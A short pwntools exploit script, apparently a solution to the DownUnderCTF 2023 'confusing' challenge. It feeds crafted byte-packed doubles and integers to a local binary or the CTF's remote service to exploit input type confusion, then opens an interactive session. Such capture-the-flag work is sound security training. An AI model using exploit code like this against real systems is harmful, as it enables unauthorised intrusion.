#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./confusing", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 2023.ductf.dev 30024"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

z = b"\xff" * 4
d = struct.unpack('d', (p16(13337) + z).ljust(8, b"\x00"))[0]
s = struct.unpack('i', b"FLAG")[0]
f = struct.pack('d', 1.6180339887)

io.sendlineafter(b"d: ", str(d).encode())
io.sendlineafter(b"s: ", str(s).encode())
io.sendlineafter(b"f: ", f)

io.interactive()
